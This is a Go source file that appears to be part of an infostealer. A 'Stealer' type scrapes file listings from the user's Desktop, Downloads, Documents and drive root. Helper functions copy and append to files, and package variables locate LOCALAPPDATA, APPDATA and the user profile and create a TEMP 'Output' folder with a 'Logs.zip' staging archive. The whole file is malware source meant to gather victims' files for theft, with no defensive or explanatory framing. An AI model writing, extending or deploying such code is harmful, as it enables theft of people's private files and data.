package main

import (
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"time"
)

type File struct {
	Name string
	Path string
}

type Files struct {
	Drive     []File
	Desktop   []File
	Downloads []File
	Documents []File
}

func GetFiles(folder string) (files []File) {
	// Scrape passed directory for filenames and filepaths
	files = []File{}

	directory := CleanPath(userPath + "\\" + folder)
	fileScrape, _ := os.ReadDir(directory)

	// Loop through list of files and store the filename and path in a File struct
	for _, file := range fileScrape {
		files = append(files, File{
			Name: file.Name(),
			Path: CleanPath(directory + "\\" + file.Name()),
		})
	}

	return files
}

func (file *File) Move(destination string) bool {
	// Move a copy of the file to the passed desination path

	return CopyFileToDirectory(file.Path, destination)
}

func (file *File) WriteString(data string) bool {
	// Append the supplied data (string) to the files content (File)
	f, err := os.OpenFile(file.Name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	defer f.Close()

	str := data + "\n"
	_, err = f.WriteString(str)

	return err == nil
}

func (file *File) WriteJson(data interface{}) bool {
	// Append the supplied data (Json) to the files content (File)
	jsonData, _ := json.MarshalIndent(data, "", "  ")
	jsonData = append(jsonData, []byte("\n")...)

	f, err := os.OpenFile(file.Path, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	if err != nil {
		return false
	}
	defer f.Close()

	_, err = f.Write(jsonData)

	return err == nil
}

func WriteString(fileName string, data string) bool {
	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	str := data + "\n"
	_, err = file.WriteString(str)

	return err == nil
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) bool {
	// Copies the supplied source file to a destination directory
	pathSourceFile = CleanPath(pathSourceFile)
	pathDestFile = CleanPath(pathDestFile)

	// Open the source file
	dataSourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return false
	}
	defer dataSourceFile.Close()

	dataDestFile, err := os.Create(pathDestFile)
	if err != nil {
		return false
	}
	defer dataDestFile.Close()

	_, err = io.Copy(dataDestFile, dataSourceFile)

	return err == nil
}

func FileExists(filePath string) bool {
	// Check if a filepath exists on the machine
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	}

	return true
}

func (stealer *Stealer) GetFileScrape() {
	defer TimeTrack(time.Now())

	// Scrape common paths using GetFiles
	stealer.Memory.Files = Files{
		Drive:     GetFiles(`\\`),
		Desktop:   GetFiles(`\\Desktop`),
		Downloads: GetFiles(`\\Downloads`),
		Documents: GetFiles(`\\Documents`),
	}
}

var (
	local      = os.Getenv("LOCALAPPDATA")
	roaming    = os.Getenv("APPDATA")
	userPath   = os.Getenv("USERPROFILE")
	tempPath   = os.Getenv("TEMP")
	outputPath = CleanPath(filepath.Join(tempPath, "Output"))
	outputZip  = CleanPath(filepath.Join(outputPath, "Logs.zip"))
	_          = os.Mkdir(outputPath, 0777)
)
